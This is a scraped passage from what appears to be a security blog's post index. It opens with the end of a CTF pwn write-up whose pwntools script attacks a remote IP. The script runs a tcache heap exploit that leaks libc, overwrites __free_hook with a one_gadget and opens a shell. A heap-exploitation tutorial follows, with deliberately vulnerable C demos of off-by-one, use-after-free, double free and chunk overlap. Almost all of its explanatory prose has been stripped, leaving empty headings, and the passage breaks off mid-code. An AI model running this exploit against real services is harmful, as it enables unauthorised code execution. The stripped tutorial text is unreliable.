class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#encoding: utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = process(\"./pwn7\")</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">'219.219.61.234'</span>,<span class=\"string\">'10050'</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(str(size))</span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(str(content))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(str(idx))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(str(idx))</span><br><span class=\"line\"><span class=\"comment\">#step1: 0x200pre_size</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>):<span class=\"comment\">#10</span></span><br><span class=\"line\"> add(<span class=\"number\">0x80</span>,<span class=\"string\">'a'</span> * <span class=\"number\">0x80</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">6</span>):<span class=\"comment\">#tcahce</span></span><br><span class=\"line\"> delete(i)</span><br><span class=\"line\">delete(<span class=\"number\">9</span>)<span class=\"comment\">#top_chunk</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">6</span>,<span class=\"number\">9</span>):</span><br><span class=\"line\"> delete(i)<span class=\"comment\">#pre_size0x0,0x100,0x200 </span></span><br><span class=\"line\"><span class=\"comment\">#free7tcache,3unsorted_bin</span></span><br><span class=\"line\"><span class=\"comment\">#step2: 0x100tcache 7unsorted_binlibc</span></span><br><span class=\"line\"><span class=\"comment\">#idx</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">7</span>): <span class=\"comment\">#tcache  6,5,4,3,2,1x,x,x,0</span></span><br><span class=\"line\"> add(<span class=\"number\">0x8</span>,p64(i))</span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,p64(<span class=\"number\">7</span>)) <span class=\"comment\">#unsorted_bin</span></span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,p64(<span class=\"number\">8</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,p64(<span class=\"number\">9</span>)) <span class=\"comment\">#10</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">6</span>): <span class=\"comment\">#idx=6 </span></span><br><span class=\"line\"> delete(i)</span><br><span class=\"line\">delete(<span class=\"number\">8</span>) <span class=\"comment\">#tcache 0x100</span></span><br><span class=\"line\">delete(<span class=\"number\">7</span>) <span class=\"comment\">#unsorted_bin Libc </span></span><br><span class=\"line\">add(<span class=\"number\">0xf8</span>, p64(<span class=\"number\">0</span>)) <span class=\"comment\">#idx=8B Cinuse</span></span><br><span class=\"line\">delete(<span class=\"number\">6</span>) <span class=\"comment\">#tcache</span></span><br><span class=\"line\">delete(<span class=\"number\">9</span>) <span class=\"comment\">#8</span></span><br><span class=\"line\"><span class=\"comment\">#step3: leak libc</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">7</span>):</span><br><span class=\"line\"> add(<span class=\"number\">0x8</span>, p64(i))</span><br><span class=\"line\">add(<span class=\"number\">0x8</span> ,p64(<span class=\"number\">7</span>))</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">'&gt; '</span>)</span><br><span class=\"line\">libc_base = u64(sh.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>)) - <span class=\"number\">0x3ebca0</span></span><br><span class=\"line\">log.success((hex(libc_base)))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">'a'</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">9</span>)</span><br><span class=\"line\">target = libc.symbols[<span class=\"string\">\"__free_hook\"</span>] + libc_base</span><br><span class=\"line\">log.success(hex(target))</span><br><span class=\"line\">sys_addr = libc.symbols[<span class=\"string\">\"system\"</span>] + libc_base</span><br><span class=\"line\">one_addr = libc_base + <span class=\"number\">0x4f432</span> <span class=\"comment\">#0x4f2c5 </span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, p64(target))</span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, <span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, p64(one_addr))</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p></p>\n<p>tcl</p>\n<p></p>\n","categories":["wp"],"tags":["WP"]},{"title":"","url":"https://pz1o.top/2020/12/22//","content":"<p></p>\n<p></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"0x01-Off-By-One\"><a href=\"#0x01-Off-By-One\" class=\"headerlink\" title=\"0x01 Off By One\"></a>0x01 Off By One</h2><h3 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h3><p>off-by-one  size </p>\n<h3 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h3><p>(1) </p>\n<p>(2)  NULL sizePREV_INUSE0 free  unlink () prev_size  prev_size </p>\n<h3 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[<span class=\"number\">40</span>]=<span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *chunk1;</span><br><span class=\"line\">    chunk1=<span class=\"built_in\">malloc</span>(<span class=\"number\">24</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Get Input\"</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);<span class=\"comment\">//</span></span><br><span class=\"line\">    gets(<span class=\"built_in\">buffer</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">strlen</span>(<span class=\"built_in\">buffer</span>)==<span class=\"number\">24</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">strcpy</span>(chunk1,<span class=\"built_in\">buffer</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>strlen  \\x00 strcpy  \\x00  off by one</p>\n<p></p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219141904042.png\" alt=\"image-20201219141904042\"></p>\n<p> 24size0x2133 </p>\n<p>pre_size</p>\n<p>24A</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219142302977.png\" alt=\"image-20201219142302977\"></p>\n<p></p>\n</blockquote>\n<h2 id=\"0x02-Use-After-Free\"><a href=\"#0x02-Use-After-Free\" class=\"headerlink\" title=\"0x02 Use After Free\"></a>0x02 Use After Free</h2><h3 id=\"1--1\"><a href=\"#1--1\" class=\"headerlink\" title=\"1.\"></a>1.</h3><p>Use After Free(UAF)</p>\n<h3 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h3><ul>\n<li> NULL <strong></strong></li>\n<li> NULL<strong></strong></li>\n</ul>\n<h3 id=\"3--1\"><a href=\"#3--1\" class=\"headerlink\" title=\"3.\"></a>3.</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">void</span> <span class=\"params\">(*func_ptr)</span><span class=\"params\">(<span class=\"keyword\">char</span> *)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">sys1</span><span class=\"params\">(<span class=\"keyword\">char</span> command[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">system(command);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">echo</span><span class=\"params\">(<span class=\"keyword\">char</span> content[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\"</span>,content);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    func_ptr *p1=(func_ptr*)<span class=\"built_in\">malloc</span>(<span class=\"number\">4</span>*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>));<span class=\"comment\">//4int</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc addr: %p\\n\"</span>,p1);<span class=\"comment\">//20x10chunk</span></span><br><span class=\"line\">    p1[<span class=\"number\">2</span>]=echo;<span class=\"comment\">//</span></span><br><span class=\"line\">    p1[<span class=\"number\">2</span>](<span class=\"string\">\"hello world\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1); <span class=\"comment\">//freep1,p1,p1</span></span><br><span class=\"line\">    p1[<span class=\"number\">2</span>](<span class=\"string\">\"hello again\\n\"</span>); <span class=\"comment\">//p1,free,.</span></span><br><span class=\"line\">    func_ptr *p2=(func_ptr*)<span class=\"built_in\">malloc</span>(<span class=\"number\">4</span>*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>));</span><br><span class=\"line\">    <span class=\"comment\">//free,</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc addr: %p\\n\"</span>,p2);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc addr: %p\\n\"</span>,p1);<span class=\"comment\">//p2p1</span></span><br><span class=\"line\">    p2[<span class=\"number\">2</span>]=sys1; <span class=\"comment\">//p1echosys1.</span></span><br><span class=\"line\">    p1[<span class=\"number\">2</span>](<span class=\"string\">\"/bin/sh\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>p1p2</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219145625345.png\" alt=\"image-20201219145625345\"></p>\n</blockquote>\n<h2 id=\"0x03-Double-Free\"><a href=\"#0x03-Double-Free\" class=\"headerlink\" title=\"0x03 Double Free\"></a>0x03 Double Free</h2><h3 id=\"1--2\"><a href=\"#1--2\" class=\"headerlink\" title=\"1.\"></a>1.</h3><p>Double FreeUAF</p>\n<h3 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Allocating 3 buffers.\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *a = <span class=\"built_in\">malloc</span>(<span class=\"number\">9</span>);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *b = <span class=\"built_in\">malloc</span>(<span class=\"number\">9</span>);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *c = <span class=\"built_in\">malloc</span>(<span class=\"number\">9</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(a, <span class=\"string\">\"AAAAAAAA\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(b, <span class=\"string\">\"BBBBBBBB\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(c, <span class=\"string\">\"CCCCCCCC\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"1st malloc(9) %p points to %s\\n\"</span>, a, a);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"2nd malloc(9) %p points to %s\\n\"</span>, b, b);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"3rd malloc(9) %p points to %s\\n\"</span>, c, c);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Freeing the first one %p.\\n\"</span>, a);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Then freeing another one %p.\\n\"</span>, b);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(b);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Freeing the first one %p again.\\n\"</span>, a);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Allocating 3 buffers.\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *d = <span class=\"built_in\">malloc</span>(<span class=\"number\">9</span>);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *e = <span class=\"built_in\">malloc</span>(<span class=\"number\">9</span>);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *f = <span class=\"built_in\">malloc</span>(<span class=\"number\">9</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(d, <span class=\"string\">\"DDDDDDDD\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"4st malloc(9) %p points to %s the first time\\n\"</span>, d, d);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(e, <span class=\"string\">\"EEEEEEEE\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"5nd malloc(9) %p points to %s\\n\"</span>, e, e);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(f, <span class=\"string\">\"FFFFFFFF\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"6rd malloc(9) %p points to %s the second time\\n\"</span>, f, f);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160532780.png\" alt=\"image-20201219160532780\"></p>\n<p> </p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160630662.png\" alt=\"image-20201219160630662\"></p>\n</blockquote>\n<h2 id=\"0x04-overlap\"><a href=\"#0x04-overlap\" class=\"headerlink\" title=\"0x04 overlap\"></a>0x04 overlap</h2><h3 id=\"1--3\"><a href=\"#1--3\" class=\"headerlink\" title=\"1.\"></a>1.</h3><p>chunk extend  extend  chunk overlapping </p>\n<h3 id=\"2--1\"><a href=\"#2--1\" class=\"headerlink\" title=\"2.\"></a>2.</h3><ul>\n<li></li>\n<li> chunk header </li>\n</ul>\n<h3 id=\"3-1fastbin\"><a href=\"#3-1fastbin\" class=\"headerlink\" title=\"3.1fastbin\"></a>3.1fastbin</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *ptr,*ptr1;</span><br><span class=\"line\"></span><br><span class=\"line\">    ptr=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//0x10chunk</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//0x10chunk</span></span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//</span></span><br><span class=\"line\">    *(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span> *)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr<span class=\"number\">-0x8</span>)=<span class=\"number\">0x41</span>;<span class=\"comment\">// size</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">    ptr1=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);<span class=\"comment\">//  extend</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214608484.png\" alt=\"image-20201219214608484\"></p>\n<p></p>\n<p>p1sizefastbin</p>\n<p>p2</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214801301.png\" alt=\"image-20201219214801301\"></p>\n<p>fastbin</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214832357.png\" alt=\"image-20201219214832357\"></p>\n<p> p2</p>\n</blockquote>\n<h3 id=\"4-2smallbin\"><a href=\"#4-2smallbin\" class=\"headerlink\" title=\"4.2smallbin\"></a>4.2smallbin</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *ptr,*ptr1;</span><br><span class=\"line\"></span><br><span class=\"line\">    ptr=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x80</span>);<span class=\"comment\">// 0x80 chunk1</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>); <span class=\"comment\">// 0x10 chunk2</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>); <span class=\"comment\">//top chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\">    *(<span class=\"keyword\">int</span> *)((<span class=\"keyword\">int</span>)ptr<span class=\"number\">-0x8</span>)=<span class=\"number\">0xb1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">    ptr1=<span class=\"built_in\">malloc</span>(<span class=\"number\">0xa0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215247031.png\" alt=\"image-20201219215247031\"></p>\n<p>size  unsortedbin</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215357168.png\" alt=\"image-20201219215357168\"></p>\n<p></p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215517292.png\" alt=\"image-20201219215517292\"></p>\n<p></p>\n</blockquote>\n<h3 id=\"5-3overlap\"><a href=\"#5-3overlap\" class=\"headerlink\" title=\"5.3overlap\"></a>5.3overlap</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span 